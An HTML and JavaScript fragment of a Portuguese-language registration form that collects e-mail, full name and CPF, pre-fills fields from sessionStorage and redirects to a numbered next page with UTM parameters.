            <!-- Seção 7: Formulário de Cadastro -->
            <div style="margin-top: 18px;" class="main-content">
                <div id="formulario" class="mb-3">
                    <p style="color:gray; text-align:initial">Preencha os campos abaixo</p>
                    <form id="cadastroForm" style="text-align:initial">

                        <div class="mb-3">
                            <label for="cpf" class="form-label" style="color:gray; font-size:13px">E-mail</label>
                            <input type="text" class="form-control" id="cpf" placeholder="email@email.com">
                        </div>
                        <div class="mb-3">
                            <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome
                                completo</label>
                            <input type="text" class="form-control" id="nome" placeholder="Ex: Maria" value="">
                        </div>
                        <div class="mb-3">
                            <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
                            <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00" value="">
                        </div>


                        <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
                            <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #3354fd;"></i>
                        </div>
                        <button class="btn-custom">Continuar</button>

                    </form>

                    <script>
                        document.addEventListener('DOMContentLoaded', function () {
                            // Recupera do sessionStorage
                            const cpf = sessionStorage.getItem('cpf');
                            const nomeCompleto = sessionStorage.getItem('nomeCompleto');

                            // Pega os elementos dos inputs
                            const inputNome = document.getElementById('nome');
                            const inputCpf = document.querySelectorAll('#cpf')[1]; // Segundo #cpf
                            const inputEmail = document.querySelectorAll('#cpf')[0]; // Primeiro #cpf (que é o email no seu HTML)

                            // Formatar CPF (000.000.000-00)
                            function formatarCpf(cpf) {
                                return cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
                            }

                            // Preencher e bloquear os campos
                            if (cpf && nomeCompleto) {
                                inputNome.value = nomeCompleto;
                                inputCpf.value = formatarCpf(cpf);
                            }

                            // Função ao clicar no botão
                            const form = document.getElementById('cadastroForm');
                            form.addEventListener('submit', function (event) {
                                event.preventDefault(); // Impede envio automático

                                const email = inputEmail.value.trim();

                                if (email !== "") {
                                    sessionStorage.setItem('email', email);

                                    // Redirecionar usando utmUtils
                                    utmUtils.redirectWithUTMs('/05/index.html');
                                } else {
                                    alert('Por favor, preencha seu e-mail antes de continuar.');
                                }
                            });

                            // Corrigir o botão (remover onclick errado no HTML)
                            const button = form.querySelector('button');
                            button.removeAttribute('onclick');
                        });
                    </script>
